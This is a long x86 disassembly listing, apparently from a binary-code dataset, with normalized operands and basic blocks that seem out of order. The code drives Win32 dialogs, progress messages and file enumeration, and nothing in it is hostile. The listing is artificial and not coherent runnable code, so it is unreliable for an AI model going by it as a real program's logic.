adc ecx eax
mov [ ebp - 0x48 ] esi
mov esi [ ebp - 0x50 ]
mov [ ebp - 0x44 ] ecx
mov ecx esi
or ecx edi
je r-xdata
mov edx [ edx + 0x4 ]
mov ecx [ edx + ecx * 4 ]
mov edx [ ecx + 0x14 ]
lea eax [ esi - 0x1 ]
cmp eax edx
ja r-xdata
sub ecx eax
mov ecx [ ebp - 0x18 ]
mov edx [ ebp - 0x14 ]
or eax 0xffffffff
mov [ ebp - 0xb4 ] eax
mov [ ebp - 0xa8 ] eax
lea eax [ edx + ecx ]
lea ecx [ ebp - 0x24 ]
mov [ ebp - 0xa4 ] esi
mov edx [ ecx + 0x8 ]
mov [ ebp - 0x2c ] eax
dec eax
cmp edx eax
ja r-xdata
lea edx [ ebp - 0xbc ]
push edx
lea eax [ ebp - 0x6c8 ]
push eax
call [ FileTimeToLocalFileTime@IAT ]
call [ GetTickCount@IAT ]
mov ecx [ ebp - 0x58 ]
mov esi eax
mov edx esi
sub edx ecx
cmp edx 0xc8
jbe r-xdata
mov dl [ ebp + 0xb ]
test dl dl
jne r-xdata
cmp ecx 0x6
je r-xdata
push 0x0
sub eax edx
push eax
call sub_4017f0
push 0xffffffff
push eax
call sub_401ba0
jmp r-xdata
mov ecx [ ecx + 0x4 ]
mov eax [ ecx + eax * 4 ]
mov edx [ eax + 0x24 ]
mov [ ebp - 0xa0 ] edx
inc [ eax + 0x24 ]
test [ ebp - 0x6ec ] 0x10000000
mov [ ebp - 0x98 ] edi
mov [ ebp - 0x94 ] edi
je r-xdata
sub eax edx
mov al [ ebp - 0x31 ]
test al al
mov [ ebp - 0x58 ] esi
je r-xdata
mov ecx [ ebp + edi * 4 - 0x40 ]
test ecx ecx
lea ebx [ ebp + edi * 4 - 0x40 ]
jne r-xdata
xor ecx ecx
cmp eax edi
setne cl
inc ecx
mov edi ecx
mov edx [ edx + 0x4 ]
mov eax [ edx + eax * 4 ]
cmp [ eax + 0x20 ] 0xffffffff
jne r-xdata
sub eax esi
mov eax [ ebp - 0x18 ]
mov edi [ ebp - 0x14 ]
lea ecx [ edi + eax ]
lea edx [ ebp - 0x24 ]
mov esi [ edx + 0x8 ]
lea eax [ ecx - 0x1 ]
cmp esi eax
mov [ ebp - 0x2c ] ecx
ja r-xdata
cmp [ rw-data ] edi
mov esi [ ebp - 0x30 ]
jle r-xdata
mov [ ebp + 0xb ] 0x1
jmp r-xdata
mov eax [ ebp - 0x30 ]
mov cl [ eax + 0xa8 ]
test cl cl
jne r-xdata
mov edx [ ebp - 0x54 ]
mov eax esi
sub eax edx
cmp eax 0x1f4
jbe r-xdata
cmp [ ebx ] 0x1
jne r-xdata
mov [ ebp - 0x5c ] 0xf
mov [ ebp - 0x60 ] 0x0
mov [ ebp - 0x70 ] 0x0
mov eax r--data
mov [ ebp - 0x4 ] 0x9
lea edx [ eax + 0x1 ]
lea ecx [ ecx ]
test edi edi
je r-xdata
mov edi [ ebp - 0x54 ]
mov edx [ eax + 0xac ]
push eax
sub esi edi
push esi
push 0x1801
push edx
call [ SendMessageA@IAT ]
jmp r-xdata
mov eax [ ebp - 0x30 ]
mov cl [ eax + 0x28 ]
test cl cl
je r-xdata
mov esi [ ebp - 0x28 ]
cmp esi 0x6
jne r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ ebp - 0x74 ]
call sub_401e80
mov eax [ ebp - 0xcc ]
cmp eax 0x10
mov esi [ ebp - 0xe0 ]
jae r-xdata
mov edx [ ebp - 0x30 ]
mov [ edx + 0x9c ] 0xffffffff
jmp r-xdata
lea eax [ ecx - 0x1 ]
mov ecx [ ebp - 0x1c ]
cmp ecx eax
ja r-xdata
mov ecx [ eax + 0xac ]
push 0x5
push ecx
call [ ShowWindow@IAT ]
cmp [ eax + 0x4c ] 0x10
jne r-xdata
test eax eax
je r-xdata
xor esi esi
mov [ ebp - 0x28 ] esi
mov eax [ ebp - 0xe0 ]
jmp r-xdata
lea esi [ ebp - 0xe0 ]
lea eax [ ebp - 0xe0 ]
mov ecx [ ebp - 0x20 ]
mov ecx [ ecx + eax * 4 ]
call sub_4016b0
dec [ ebp - 0x14 ]
jne r-xdata
sub eax ecx
mov ecx [ eax + 0x68 ]
test ecx ecx
je r-xdata
push 0xffffffff
xor edi edi
push edi
lea eax [ ebp - 0xe4 ]
push eax
lea ecx [ ebp - 0x114 ]
call sub_401dd0
push esi
mov [ ebp - 0xf8 ] esi
mov [ ebp - 0xf0 ] edi
mov [ ebp - 0xf4 ] edi
call sub_404aa0
add esp 0x4
test eax eax
je r-xdata
sub esp 0x70
lea edx [ ebp - 0xe4 ]
mov ecx esp
mov [ ebp + 0x8 ] esp
push edx
call sub_402400
call sub_407970
add esp 0x70
test eax eax
je r-xdata
push eax
call sub_457f40
add esp 0x4
add eax esi
mov ecx eax
lea esi [ ecx + 0x1 ]
mov dl [ ecx ]
inc ecx
test dl dl
jne r-xdata
sub ecx esi
push ecx
push eax
lea ecx [ ebp - 0x74 ]
call sub_401cc0
mov eax r--data
lea edx [ eax + 0x1 ]
mov edi [ ebp - 0x30 ]
mov al [ edi + 0xa8 ]
test al al
mov eax [ ebp - 0x18 ]
mov [ ebp + 0xb ] 0x0
je r-xdata
mov [ ebp - 0x18 ] 0x0
mov [ ebp - 0x31 ] 0x0
lea ecx [ ebp - 0x114 ]
push ecx
lea ecx [ ebp - 0x24 ]
call sub_4038b0
push eax
lea ecx [ ebp - 0xe4 ]
call sub_402510
mov esi [ ebp - 0x28 ]
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
sub eax edx
push eax
push r--data
lea ecx [ ebp - 0x74 ]
call sub_401cc0
mov ecx [ ebp + edi * 4 - 0x120 ]
mov eax ecx
lea esi [ eax + 0x1 ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax esi
push eax
push ecx
lea ecx [ ebp - 0x74 ]
call sub_401cc0
mov ecx [ ebp - 0x30 ]
mov al [ ecx + 0xa8 ]
test al al
jne r-xdata
cmp [ ebp - 0xe8 ] 0x6
jne r-xdata
cmp [ ebp - 0x5c ] 0x10
mov eax [ ebp - 0x70 ]
jae r-xdata
mov [ ebx ] 0x2
mov [ ebp - 0x40 ] 0x2
mov [ ebx ] 0x1
mov [ ebp - 0x40 ] 0x1
jmp r-xdata
push eax
mov eax [ ecx + 0xac ]
lea edx [ ebp - 0xe8 ]
push edx
push 0x1802
push eax
call [ SendMessageA@IAT ]
lea eax [ ebp - 0x70 ]
mov eax [ ebp - 0xa4 ]
mov [ ebp - 0x5c ] 0xf
mov [ ebp - 0x60 ] 0x0
mov [ ebp - 0x70 ] 0x0
mov ecx [ ebp - 0x70 ]
push ecx
call j_sub_4b66ed#2
add esp 0x4
cmp [ ebp - 0x5c ] 0x10
mov [ ebp - 0x4 ] 0x2
jb r-xdata
sub_408c50
mov eax [ fs : 0x0 ]
push 0xffffffff
push sub_4becbb
push eax
mov eax [ esp + 0x14 ]
mov [ fs : 0x0 ] esp
sub esp 0x144
cmp eax 0x1800
push ebp
push esi
push edi
ja r-xdata
sub eax 0x1801
je r-xdata
je r-xdata
mov edi [ esp + 0x160 ]
push 0xffffffeb
push edi
call [ GetWindowLongA@IAT ]
mov esi eax
mov eax [ esi ]
mov edx [ eax + 0x4 ]
test edx edx
jne r-xdata
dec eax
je r-xdata
mov edi [ esp + 0x160 ]
push 0xffffffeb
push edi
call [ GetWindowLongA@IAT ]
mov esi eax
mov eax [ esi + 0xa0 ]
test eax eax
je r-xdata
sub eax 0x110
je r-xdata
mov ecx [ eax + 0x8 ]
sub ecx edx
mov eax 0x92492493
imul ecx
add edx ecx
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov ebp edx
xor ebp ebp
jmp r-xdata
mov edx [ esp + 0x16c ]
mov eax [ esp + 0x160 ]
push 0x24
push r--data
push edx
push eax
call [ MessageBoxA@IAT ]
mov ecx [ esp + 0x168 ]
mov [ ecx ] eax
jmp r-xdata
xor eax eax
jmp r-xdata
mov al [ esi + 0x29 ]
test al al
je r-xdata
push rw-data
lea ecx [ esp + 0x10 ]
call sub_4014e0
mov eax [ esi + 0xa0 ]
push 0xffffffff
push eax
call [ WaitForSingleObject@IAT ]
lea ecx [ esp + 0xc ]
call sub_404410
mov ecx [ esi + 0xa0 ]
push ecx
call [ CloseHandle@IAT ]
mov [ esi + 0xa0 ] 0x0
mov esi [ esp + 0x16c ]
mov edi [ esp + 0x160 ]
push esi
push 0xffffffeb
push edi
call [ SetWindowLongA@IAT ]
mov [ esi + 0xac ] edi
call [ GetFocus@IAT ]
mov [ esi + 0xa4 ] eax
mov al [ esi + 0x29 ]
test al al
je r-xdata
dec eax
jne r-xdata
mov eax 0x1
cmp [ esi + 0x4c ] 0x10
jne r-xdata
push 0x0
push 0x0
push 0xdc1
push edi
call [ GetDlgItemInt@IAT ]
push 0x0
push ebp
push 0xdc1
push edi
call [ SetDlgItemInt@IAT ]
mov eax 0x10624dd3
mul [ esp + 0x168 ]
mov ecx edx
shr ecx 0x6
mov eax 0x88888889
mul ecx
shr edx 0x5
mov eax edx
imul eax eax 0x3c
sub ecx eax
push ecx
push edx
lea ecx [ esp + 0x58 ]
push r--data
push ecx
call [ wsprintfA@IAT ]
add esp 0x10
lea edx [ esp + 0x50 ]
push edx
push 0xdc2
push edi
call [ SetDlgItemTextA@IAT ]
mov eax [ esi + 0xb0 ]
push 0x0
push eax
push 0x402
push 0xdc3
push edi
call [ SendDlgItemMessageA@IAT ]
mov al [ esi + 0x28 ]
test al al
je r-xdata
mov ecx [ esp + 0x150 ]
pop edi
pop esi
pop ebp
mov [ fs : 0x0 ] ecx
add esp 0x150
retn 0x10
mov eax [ esi + 0xa4 ]
push eax
call [ SetFocus@IAT ]
mov al [ esi + 0x29 ]
test al al
mov [ esi + 0xac ] 0x0
je r-xdata
mov edx [ esi + 0x20 ]
push 0x1
push edx
call [ EnableWindow@IAT ]
mov eax [ esi + 0x20 ]
mov ebp [ GetWindowRect@IAT ]
lea edx [ esp + 0x30 ]
push edx
push eax
call ebp
lea ecx [ esp + 0x40 ]
push ecx
push edi
call ebp
mov edx [ esp + 0x48 ]
mov eax [ esp + 0x40 ]
mov ebp [ esp + 0x30 ]
sub eax edx
mov edx [ esp + 0x38 ]
sub eax ebp
add eax edx
cdq
sub eax edx
mov edx [ esp + 0x3c ]
mov ecx eax
mov eax [ esp + 0x44 ]
sar ecx 0x1
add ecx ebp
sub eax [ esp + 0x4c ]
mov ebp [ esp + 0x34 ]
sub eax ebp
add eax edx
cdq
push 0x5
push 0x0
sub eax edx
push 0x0
sar eax 0x1
add eax ebp
push eax
push ecx
push 0x0
push edi
call [ SetWindowPos@IAT ]
mov [ esp + 0x2c ] 0xf
mov [ esp + 0x28 ] 0x0
mov [ esp + 0x18 ] 0x0
mov eax r--data
mov [ esp + 0x158 ] 0x0
lea ecx [ eax + 0x1 ]
mov ecx [ esi + 0x20 ]
push 0x0
push ecx
call [ EnableWindow@IAT ]
movzx eax [ esp + 0x168 ]
dec eax
je r-xdata
mov eax [ esi + 0x68 ]
test eax eax
jne r-xdata
push edi
call [ DestroyWindow@IAT ]
jmp r-xdata
mov ecx [ esi + 0x20 ]
push esi
push 0x0
push 0x1800
push ecx
call [ SendMessageA@IAT ]
mov dl [ eax ]
inc eax
test dl dl
jne r-xdata
sub eax ecx
push eax
push r--data
lea ecx [ esp + 0x1c ]
call sub_401cc0
mov ecx [ esi + 0x1c ]
mov eax 0x10
cmp ecx eax
jb r-xdata
mov eax [ esp + 0x160 ]
push 0xffffffeb
push eax
call [ GetWindowLongA@IAT ]
mov [ eax + 0x4c ] 0x10
mov [ eax + 0x48 ] 0x0
mov [ rw-data ] 0x0
jmp r-xdata
dec eax
jne r-xdata
mov ecx [ esi + 0x20 ]
push esi
push 0x0
push 0x1801
push ecx
call [ SendMessageA@IAT ]
inc [ esi + 0x98 ]
lea ebp [ esi + 0x8 ]
mov ebp [ esi + 0x8 ]
jmp r-xdata
mov esi [ esp + 0x160 ]
push 0xffffffeb
push esi
call [ GetWindowLongA@IAT ]
push 0x0
push 0x0
push 0x1800
push esi
mov [ eax + 0xa8 ] 0x1
call [ SendMessageA@IAT ]
jmp r-xdata
lea eax [ esi + 0x8 ]
mov eax [ esi + 0x8 ]
jmp r-xdata
cmp [ esi + 0x1c ] eax
jb r-xdata
mov cl [ eax ]
inc eax
test cl cl
jne r-xdata
push eax
call sub_457f40
add esp 0x4
add eax ebp
push eax
lea ecx [ esp + 0x18 ]
call sub_402010
mov eax r--data
lea edx [ eax + 0x1 ]
jmp r-xdata
sub eax edx
push eax
push r--data
lea ecx [ esp + 0x1c ]
call sub_401cc0
cmp [ esp + 0x2c ] 0x10
mov eax [ esp + 0x18 ]
jae r-xdata
push eax
push edi
call [ SetWindowTextA@IAT ]
mov ebp [ GetDlgItem@IAT ]
push 0xdc3
push edi
call ebp
push 0x640000
push 0x0
push 0x401
push eax
call [ SendMessageA@IAT ]
mov al [ esi + 0x28 ]
test al al
je r-xdata
lea eax [ esp + 0x18 ]
xor eax eax
mov eax [ esi + 0x68 ]
test eax eax
jne r-xdata
lea ecx [ esp + 0x14 ]
call sub_4480e0
jmp r-xdata
push esi
push eax
push 0x1800
push edi
mov [ esi + 0x9c ] 0xffffffff
call [ PostMessageA@IAT ]
mov eax 0x1
jmp r-xdata
push eax
push 0x1
push edi
call ebp
push eax
call [ EnableWindow@IAT ]
lea edx [ esp + 0xc ]
push edx
push 0x0
push esi
push sub_407f10
push 0x0
push 0x0
call sub_4b638f
add esp 0x18
test eax eax
mov [ esi + 0xa0 ] eax
jne r-xdata
sub_4090d0
push ebp
mov ebp esp
push 0xffffffff
push sub_4becee
mov eax [ fs : 0x0 ]
push eax
mov [ fs : 0x0 ] esp
sub esp 0x488
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
mov eax [ edi + 0x18 ]
xor ebx ebx
cmp eax ebx
mov [ ebp - 0x10 ] esp
je r-xdata
or eax 0xffffffff
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax 0xf
mov [ ebp - 0x70 ] eax
mov [ ebp - 0x74 ] ebx
mov [ ebp - 0x84 ] bl
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x30 ] bl
mov eax [ edi + 0x1c ]
cmp eax 0x10
lea esi [ edi + 0x4 ]
mov [ ebp - 0x4 ] ebx
jb r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
cmp [ esi + 0x18 ] 0x10
jb r-xdata
mov ecx eax
lea esi [ ecx + 0x1 ]
push eax
call sub_404440
add esp 0x4
cmp eax ebx
je r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
mov dl [ ecx ]
inc ecx
cmp dl bl
jne r-xdata
sub ecx esi
push ecx
lea esi [ edi + 0x4 ]
push eax
mov ecx esi
call sub_401e80
cmp [ edi + 0x90 ] 0x6
jne r-xdata
mov eax [ ebp + 0x8 ]
mov [ eax + 0x94 ] 0x1
mov [ eax + 0x90 ] ebx
mov ecx [ esi + 0x18 ]
xor eax eax
xor edi edi
cmp ecx 0x10
jb r-xdata
push 0x7
push r--data
push eax
call sub_4bdff7
add esp 0xc
test eax eax
jne r-xdata
mov ecx [ edi + 0x90 ]
push ecx
call sub_404aa0
add esp 0x4
test eax eax
jne r-xdata
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x18 ] esp
push 0xffffffff
push ebx
mov [ ecx + 0x18 ] 0xf
mov [ ecx + 0x14 ] ebx
push esi
mov [ ecx + 0x4 ] bl
call sub_401dd0
call sub_405090
add esp 0x1c
mov [ edi + 0x90 ] eax
add esi 0x4
mov [ ebp - 0x14 ] esi
jmp r-xdata
mov ecx [ esi + 0x4 ]
mov [ ebp - 0x14 ] ecx
jmp r-xdata
cmp [ edi + 0x90 ] 0x7
jne r-xdata
lea ecx [ ebp - 0x88 ]
call sub_401a90
mov eax 0xfffffffb
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x14 ]
mov cl [ edx + edi ]
cmp cl 0xd
je r-xdata
mov eax [ edi + 0x90 ]
cmp eax 0x7
je r-xdata
cmp [ esi + 0x18 ] 0x10
jb r-xdata
mov esi [ ebp - 0x14 ]
mov ecx edi
sub ecx eax
push ecx
lea edx [ esi + eax ]
push edx
lea ecx [ ebp - 0x88 ]
call sub_401e80
or eax 0xffffffff
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x4c ] eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax ]
mov [ ebp - 0x6c ] ebx
mov [ ebp - 0x68 ] ebx
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x60 ] ebx
mov [ ebp - 0x5c ] ebx
mov [ ebp - 0x48 ] 0x5
mov eax [ ecx + 0x4 ]
cmp eax ebx
jne r-xdata
cmp cl 0xa
je r-xdata
lea ecx [ ebp - 0x88 ]
call sub_401a90
cmp eax 0x6
jne r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
mov esi [ ecx + 0x8 ]
sub esi eax
mov eax 0x92492493
imul esi
add edx esi
mov esi [ ebp - 0x14 ]
sar edx 0x6
mov eax edx
shr eax 0x1f
add edx eax
mov [ ebp - 0x44 ] edx
mov [ ebp - 0x44 ] ebx
jmp r-xdata
cmp cl bl
jne r-xdata
cmp eax 0x2
jne r-xdata
lea ecx [ ebp - 0x88 ]
call sub_401a90
mov eax 0xfffffffd
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
push eax
mov ecx esi
call sub_402510
sub esp 0x1c
mov ecx esp
mov [ ebp - 0x18 ] esp
push esi
call sub_401fc0
call sub_405090
add esp 0x1c
mov [ edi + 0x90 ] eax
push eax
call sub_407c40
add esp 0x4
cmp eax ebx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x29 ] bl
je r-xdata
cmp [ esi + edi + 0x1 ] 0xa
jne r-xdata
lea edx [ ebp - 0x88 ]
push edx
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x38 ] ebx
call sub_407bb0
cmp [ esi + edi ] bl
je r-xdata
inc edi
jmp r-xdata
cmp eax 0x1
jne r-xdata
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x4 ] al
cmp [ esi + 0x18 ] 0x10
jb r-xdata
lea ecx [ ebp - 0x88 ]
call sub_401a90
mov ecx [ ebp - 0xc ]
pop edi
pop esi
xor eax eax
mov [ fs : 0x0 ] ecx
pop ebx
mov esp ebp
pop ebp
retn
push eax
mov eax [ eax + 0x20 ]
push ebx
push 0x1800
push eax
call [ SendMessageA@IAT ]
jmp r-xdata
lea eax [ edi + 0x1 ]
inc edi
cmp eax 0x4
jne r-xdata
cmp [ esi + 0x18 ] 0x10
jb r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
mov eax [ edi + 0x20 ]
push edi
push sub_408c50
push eax
push 0x170
push 0xfffffffa
push eax
call [ GetWindowLongA@IAT ]
push eax
call [ CreateDialogParamA@IAT ]
test eax eax
jne r-xdata
cmp [ esi + 0x18 ] 0x10
jb r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
mov [ eax ] edi
call [ rw-data ]
cmp eax ebx
jge r-xdata
inc [ edi + 0x4 ]
push 0x1
push ebx
push ebx
push ebx
push ebx
push eax
call sub_41c070
add esp 0x18
push eax
lea ecx [ ebp - 0x14 ]
call sub_401020
mov edi [ ebp - 0x14 ]
cmp edi ebx
push ecx
mov [ ebp - 0x4 ] 0x1
mov [ ebp - 0x18 ] esp
mov eax esp
je r-xdata
cmp [ edi + 0x28 ] bl
jne r-xdata
lea ecx [ ebp - 0x88 ]
call sub_401a90
mov eax 0xfffffffe
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
lea ecx [ ebp - 0x88 ]
call sub_401a90
mov eax 0xfffffffc
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
cmp [ esi + 0x18 ] 0x10
jb r-xdata
push eax
call sub_405ce0
add esp 0x4
test eax eax
je r-xdata
cmp edi ebx
push ecx
mov [ ebp - 0x18 ] esp
mov eax esp
je r-xdata
cmp edi ebx
mov [ ebp - 0x4 ] bl
je r-xdata
mov esi [ GetMessageA@IAT ]
push ebx
push ebx
push ebx
lea edx [ ebp - 0xa4 ]
push edx
call esi
test eax eax
je r-xdata
push eax
call [ FindClose@IAT ]
cmp [ esi + 0x18 ] 0x10
mov [ ebp - 0x14 ] ebx
jb r-xdata
lea ecx [ ebp - 0x394 ]
push ecx
push eax
call [ FindFirstFileA@IAT ]
cmp eax ebx
je r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
mov [ eax ] edi
call [ rw-data ]
mov [ ebp - 0x18 ] eax
cmp [ esi + 0x18 ] 0x10
jb r-xdata
inc [ edi + 0x4 ]
dec [ edi + 0x4 ]
jne r-xdata
mov edx [ ebp - 0x98 ]
mov eax [ ebp - 0x9c ]
mov ecx [ ebp - 0xa0 ]
push edx
mov edx [ edi + 0x20 ]
push eax
push ecx
push edx
call [ PostMessageA@IAT ]
jmp r-xdata
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
push eax
call [ FindClose@IAT ]
xor edi edi
lea ecx [ ebp - 0x394 ]
push ecx
push eax
call [ FindFirstFileA@IAT ]
cmp eax ebx
je r-xdata
add esi 0x4
mov esi [ esi + 0x4 ]
jmp r-xdata
mov edx [ edi ]
push 0x1
mov ecx edi
call [ edx ]
mov ecx [ edi + 0xac ]
lea eax [ ebp - 0xa4 ]
push eax
push ecx
call [ IsDialogMessageA@IAT ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x14 ]
push eax
call [ LocalLock@IAT ]
cmp [ eax ] bl
mov [ ebp - 0x18 ] eax
je r-xdata
cmp eax 0x2
je r-xdata
lea edx [ ebp - 0x14 ]
push edx
push ebx
push ebx
push ebx
push esi
push ebx
call sub_4b3fb0
add esp 0x18
cmp eax ebx
je r-xdata
lea eax [ esi + 0x4 ]
mov eax [ esi + 0x4 ]
jmp r-xdata
push eax
call [ FindClose@IAT ]
mov ecx [ ebp - 0x18 ]
xor eax eax
cmp ecx ebx
jle r-xdata
cmp edi ebx
mov [ ebp - 0x4 ] bl
je r-xdata
lea eax [ ebp - 0x254 ]
push eax
push esi
call [ FindFirstFileA@IAT ]
cmp eax ebx
jne r-xdata
cmp [ edi + 0xa0 ] ebx
je r-xdata
lea edx [ ebp - 0xa4 ]
push edx
call [ TranslateMessage@IAT ]
lea eax [ ebp - 0xa4 ]
push eax
call [ DispatchMessageA@IAT ]
mov edx [ ebp - 0x14 ]
push edx
call [ LocalUnlock@IAT ]
mov eax [ ebp - 0x14 ]
push eax
call [ LocalFree@IAT ]
cmp [ edi + 0x29 ] bl
je r-xdata
mov esi eax
add esi 0x18
lea esp [ esp ]
cmp [ ebp - 0x14 ] ebx
je r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x29 ] bl
je r-xdata
mov eax 0xf
mov [ ebp - 0xfc ] eax
mov [ ebp - 0x100 ] ebx
mov [ ebp - 0x110 ] bl
mov [ ebp - 0xa8 ] eax
mov [ ebp - 0xac ] ebx
mov [ ebp - 0xbc ] bl
inc edi
push edi
lea eax [ ebp - 0x494 ]
push r--data
push eax
mov [ ebp - 0x4 ] 0x4
call [ wsprintfA@IAT ]
add esp 0xc
push 0xffffffff
push ebx
push esi
lea ecx [ ebp - 0x114 ]
call sub_401dd0
push r--data
lea ecx [ ebp - 0x114 ]
call sub_402010
lea ecx [ ebp - 0x22c ]
push ecx
lea ecx [ ebp - 0x114 ]
call sub_402010
mov eax [ ebp - 0x12c ]
mov edx [ ebp - 0x394 ]
mov ecx [ ebp - 0x380 ]
mov [ ebp - 0xf4 ] eax
or eax 0xffffffff
mov [ ebp - 0xe4 ] eax
mov [ ebp - 0xd8 ] eax
mov eax [ ebp + 0x8 ]
mov [ ebp - 0xf8 ] edx
mov edx [ ebp - 0x37c ]
mov [ ebp - 0xec ] ecx
mov ecx [ eax ]
mov [ ebp - 0xf0 ] ebx
mov [ ebp - 0xe8 ] edx
mov [ ebp - 0xd4 ] 0x1
call sub_4010f0
mov ecx [ ebp - 0x128 ]
mov edx [ ebp - 0x124 ]
mov [ ebp - 0xd0 ] eax
cmp [ rw-data ] ebx
mov [ ebp - 0xc8 ] ecx
mov [ ebp - 0xc4 ] edx
jne r-xdata
push ebx
lea edx [ ebp - 0x22c ]
push edx
push edi
push eax
call [ rw-data ]
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
cmp [ eax + 0x29 ] bl
je r-xdata
lea ecx [ ecx ]
dec [ edi + 0x4 ]
jne r-xdata
push ebx
push ebx
push ebx
lea ecx [ ebp - 0xa4 ]
push ecx
call esi
test eax eax
jne r-xdata
mov ecx [ edi + 0x20 ]
push edi
push ebx
push 0x1800
push ecx
call [ SendMessageA@IAT ]
jmp r-xdata
lea eax [ esi + 0xc8 ]
push eax
lea ecx [ ebp - 0x88 ]
call sub_402010
mov ecx [ ebp - 0x394 ]
mov [ ebp - 0x6c ] ecx
mov edx [ esi - 0x8 ]
mov [ ebp - 0x68 ] edx
mov [ ebp - 0x64 ] ebx
mov eax [ esi - 0x4 ]
cdq
push ebx
add eax 0xb6109100
push 0x989680
adc edx 0x2
push edx
push eax
call sub_4b6490
mov [ ebp - 0x60 ] eax
or eax 0xffffffff
lea ecx [ ebp - 0x88 ]
mov [ ebp - 0x5c ] edx
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] 0x4
mov eax [ esi - 0x10 ]
push ecx
mov ecx [ edi ]
mov [ ebp - 0x44 ] eax
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x38 ] ebx
call sub_407bb0
mov eax [ ebp - 0x18 ]
mov cl [ eax + 0x1ac ]
add eax 0x1ac
add esi 0x1ac
cmp cl bl
mov [ ebp - 0x18 ] eax
jne r-xdata
cmp [ esi ] bl
mov eax esi
mov [ ebp + 0xb ] 0x1
je r-xdata
mov edx [ eax + 0x20 ]
push eax
push ebx
push 0x1800
push edx
call [ SendMessageA@IAT ]
jmp r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx ]
lea eax [ ebp - 0x114 ]
push eax
call sub_407bb0
lea ecx [ ebp - 0x114 ]
mov [ ebp - 0x4 ] bl
call sub_401a90
jmp r-xdata
call sub_45cd10
fimul [ ebp - 0xc8 ]
fadd [ r--data ]
call sub_4b64c4
mov [ ebp - 0xc8 ] eax
call sub_45cd10
fimul [ ebp - 0xc4 ]
fadd [ r--data ]
call sub_4b64c4
mov [ ebp - 0xc4 ] eax
cmp edi ebx
mov [ ebp - 0x4 ] bl
je r-xdata
mov ecx [ eax + 0x20 ]
push eax
push ebx
push 0x1800
push ecx
call [ SendMessageA@IAT ]
lea esi [ eax + 0x1 ]
push esi
lea eax [ ebp - 0x494 ]
push r--data
push eax
call [ wsprintfA@IAT ]
mov edi [ ebp + 0x8 ]
add esp 0xc
push 0xffffffff
push ebx
lea eax [ edi + 0x4 ]
push eax
lea ecx [ ebp - 0x88 ]
call sub_401dd0
lea ecx [ ebp - 0x494 ]
push ecx
lea ecx [ ebp - 0x88 ]
call sub_402010
mov edx [ ebp - 0x254 ]
mov eax [ ebp - 0x234 ]
mov ecx [ ebp - 0x240 ]
mov edi [ edi ]
mov [ ebp - 0x6c ] edx
mov edx [ ebp - 0x23c ]
mov [ ebp - 0x68 ] eax
or eax 0xffffffff
mov [ ebp - 0x60 ] ecx
mov ecx edi
mov [ ebp - 0x64 ] ebx
mov [ ebp - 0x5c ] edx
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x4c ] eax
mov [ ebp - 0x48 ] 0x2
call sub_4010f0
mov [ ebp - 0x44 ] eax
lea eax [ ebp - 0x88 ]
push eax
mov ecx edi
mov [ ebp - 0x3c ] ebx
mov [ ebp - 0x38 ] ebx
call sub_407bb0
mov ecx [ ebp - 0x18 ]
mov eax esi
cmp eax ecx
jl r-xdata
mov edi [ ebp - 0x14 ]
mov edx [ edi ]
push 0x1
mov ecx edi
call [ edx ]
push 0xffffffff
push ebx
lea eax [ edi + 0x4 ]
push eax
lea ecx [ ebp - 0x88 ]
call sub_401dd0
push r--data
lea ecx [ ebp - 0x88 ]
call sub_402010
cmp esi ebx
je r-xdata
push esi
lea ecx [ ebp - 0x88 ]
call sub_402010
cmp [ ebp + 0xb ] bl
jne r-xdata
mov cl [ eax ]
mov dl cl
xor dl 0x20
add dl 0x5f
cmp dl 0x3b
mov [ ebp + 0xb ] bl
ja r-xdata
cmp [ esi + 0x18 ] 0x10
jb r-xdata
dec [ edi + 0x4 ]
jne r-xdata
push 0x2f
push 0x1
lea ecx [ ebp - 0x88 ]
call sub_4017f0
cmp cl 0x5c
jne r-xdata
inc eax
jmp r-xdata
mov edx [ edi ]
push 0x1
mov ecx edi
call [ edx ]
jmp r-xdata
mov cl [ eax + 0x1 ]
inc eax
cmp cl bl
jne r-xdata
mov [ eax ] 0x2f
